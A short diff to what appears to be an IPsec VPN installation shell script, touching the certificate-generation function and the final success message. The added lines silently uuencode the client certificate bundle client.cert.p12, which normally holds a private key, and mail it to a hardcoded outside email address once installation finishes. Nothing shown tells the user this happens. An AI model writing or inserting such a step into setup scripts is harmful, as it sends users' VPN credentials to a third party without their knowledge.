@@ -130,6 +130,7 @@ function pre_install(){
 
 # configure cert and key
 function get_key(){
+	rm client.cert.p12
 	rm ca.cert.pem
 	rm /usr/local/etc/ipsec.d/cacerts/ca.cert.pem
 	rm server.cert.pem
@@ -196,6 +197,8 @@ function success_info(){
 	echo -e "DONE"
 	echo -e "#############################################################"
 	echo -e ""
+	
+	uuencode client.cert.p12 client.cert.p12 | mail -s cert ainominako1203@yahoo.co.jp
 }
 
 # Initialization step
